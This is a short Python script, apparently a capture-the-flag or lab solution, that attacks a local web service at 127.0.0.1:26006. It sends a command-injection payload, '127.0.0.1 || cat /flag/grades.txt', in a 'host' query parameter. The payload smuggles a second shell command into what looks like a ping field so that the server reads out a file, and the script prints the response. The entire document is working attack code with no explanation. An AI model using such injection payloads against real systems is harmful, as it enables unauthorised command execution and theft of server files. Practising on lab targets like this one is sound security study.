import requests

base_url = "http://127.0.0.1:26006"

def exploit():
    payload = "127.0.0.1 || cat /flag/grades.txt "
    try:
        r = requests.get(base_url, timeout=5, params={'host':payload})
        print(f"[+] Sending exploit to: {r.url}")

        print("Response:")
        print(r.text)

    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    exploit()
